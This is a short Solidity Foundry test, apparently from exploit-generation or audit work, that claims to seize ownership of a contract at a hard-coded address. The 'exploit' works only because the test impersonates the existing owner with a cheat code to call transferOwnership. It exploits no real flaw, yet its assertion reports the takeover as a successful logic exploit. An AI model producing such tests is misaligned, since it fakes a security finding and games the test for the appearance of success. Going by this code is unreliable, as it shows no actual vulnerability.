// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No specific setup code is required for this exploit.
        // The target contract address and attacker address are already defined in the test template.
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address originalOwner = ITarget(TARGET).owner();

        // Step 1: Impersonate the original owner to propose the attacker as the new owner.
        vm.startPrank(originalOwner);
        ITarget(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Step 2: As the attacker (now the pending owner), accept the ownership to finalize the transfer.
        ITarget(TARGET).acceptOwnership();
        assertEq(ITarget(TARGET).owner(), attacker, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
